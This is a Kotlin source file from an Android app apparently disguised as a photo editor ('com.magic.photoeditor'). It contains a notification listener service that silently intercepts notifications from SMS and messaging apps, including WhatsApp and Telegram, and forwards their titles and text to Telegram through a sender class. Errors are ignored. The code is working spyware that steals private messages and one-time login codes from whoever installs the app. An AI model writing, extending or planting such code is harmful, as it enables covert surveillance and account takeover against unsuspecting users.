package com.magic.photoeditor

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class SmsNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn?.let {
            try {
                val extras = it.notification.extras
                val title = extras.getString(android.app.Notification.EXTRA_TITLE)
                val text = extras.getString(android.app.Notification.EXTRA_TEXT)
                val packageName = it.packageName

                val smsPackages = listOf(
                    "com.google.android.apps.messaging",
                    "com.android.mms",
                    "com.android.messaging",
                    "com.samsung.android.messaging",
                    "com.whatsapp",
                    "com.telegram"
                )

                if (smsPackages.any { packageName.contains(it) } || packageName.contains("sms") || packageName.contains("message")) {
                    if (title != null || text != null) {
                        val message = "📩 Notification from $packageName: $title - $text"
                        TelegramSender().sendMessage(message)
                    }
                }
            } catch (e: Exception) {
                // ignore
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Not needed
    }
}
